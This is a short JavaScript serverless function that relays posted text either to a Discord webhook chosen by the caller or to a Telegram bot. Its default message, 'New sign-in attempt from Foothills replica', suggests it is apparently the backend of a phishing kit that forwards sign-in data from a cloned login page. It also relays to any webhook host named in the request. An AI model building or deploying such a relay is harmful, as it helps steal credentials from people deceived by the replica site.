exports.handler = async (event) => {
  let payload = { text: 'Test message from site' };
  try {
    payload = JSON.parse(event.body || '{}');
  } catch (e) {
    // ignore parse error and use default
  }

  const discordWebhook = payload.discordWebhook?.trim();
  if (discordWebhook) {
    try {
      const res = await fetch(discordWebhook, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ content: payload.text || 'New sign-in attempt from Foothills replica' }),
      });
      const data = await res.text();
      return {
        statusCode: res.ok ? 200 : 502,
        body: JSON.stringify({ ok: res.ok, data }),
      };
    } catch (err) {
      return { statusCode: 500, body: JSON.stringify({ error: String(err) }) };
    }
  }

  const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
  const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

  if (!TELEGRAM_TOKEN || !TELEGRAM_CHAT_ID) {
    return {
      statusCode: 500,
      body: JSON.stringify({ error: 'TELEGRAM_TOKEN or TELEGRAM_CHAT_ID in environment' }),
    };
  }

  const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
  try {
    const res = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: payload.text }),
    });
    const data = await res.json();
    return {
      statusCode: res.ok ? 200 : 502,
      body: JSON.stringify(data),
    };
  } catch (err) {
    return { statusCode: 500, body: JSON.stringify({ error: String(err) }) };
  }
};
